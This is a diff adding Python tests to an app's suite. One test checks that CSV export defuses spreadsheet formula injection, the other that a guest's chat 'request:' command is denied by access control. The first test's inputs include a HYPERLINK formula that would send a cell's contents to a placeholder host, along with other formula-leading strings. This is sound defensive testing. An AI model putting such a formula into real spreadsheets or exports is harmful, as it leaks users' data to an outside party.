@@ -155,3 +155,45 @@ def test_the_app_route_checks_rbac(
     assert len(_requests(session)) == 1
     denied = session.exec(select(Event).where(Event.action == "rbac.deny")).all()
     assert any((e.after or {})["resource"] == "data:feature_requests" for e in denied)
+
+
+def test_the_export_never_hands_a_spreadsheet_a_formula(
+    session: Session, ferinos: tuple[Any, dict[str, Person]]
+) -> None:
+    """H5: a cell that starts with =, +, -, @, tab or carriage return gets a quote; the
+    stored text stays as typed."""
+    import csv
+    import io
+
+    ana = ferinos[1]["Ana"]
+    texts = ['=HYPERLINK("http://x/?"&A1,"open")', "+1 cmd", "-x", "@sum", "safe"]
+    for text in texts:
+        features.request(session, ana, text, Actor.person(ana))
+    session.commit()
+    rows = list(csv.reader(io.StringIO(features.export_csv(session))))[1:]
+    assert {r[2] for r in rows} == {"'" + x for x in texts[:4]} | {"safe"}
+    assert all(c[:1] not in ("=", "+", "-", "@", "\t", "\r") for r in rows for c in r)
+    assert {r["text"] for r in _requests(session)} >= {texts[0], "safe"}
+
+
+def test_the_chat_request_runs_the_same_rbac_check(
+    session: Session, ferinos: tuple[Any, dict[str, Person]], sales_jev: None
+) -> None:
+    """M4: "request: ..." in chat checks data:feature_requests as POST /feature-requests."""
+    ana = ferinos[1]["Ana"]
+    guest = store.insert(
+        session,
+        Person(branch_id=ana.branch_id, name="Guest", roles=["guest"], language="en"),
+        Actor.system(ana.branch_id),
+    )
+    session.commit()
+    from mia.chat import service
+
+    thread, message = service._store(session, guest, "request: dark mode", None)
+    reply = asyncio.run(service.respond(session, guest, thread, message))
+    session.commit()
+    assert reply.text() == t("denied.generic", "en") and _requests(session) == []
+    denied = session.exec(select(Event).where(Event.action == "rbac.deny")).all()
+    assert any((e.after or {})["resource"] == "data:feature_requests" for e in denied)
+    _turn(session, ana, "request: dark mode")
+    assert len(_requests(session)) == 1
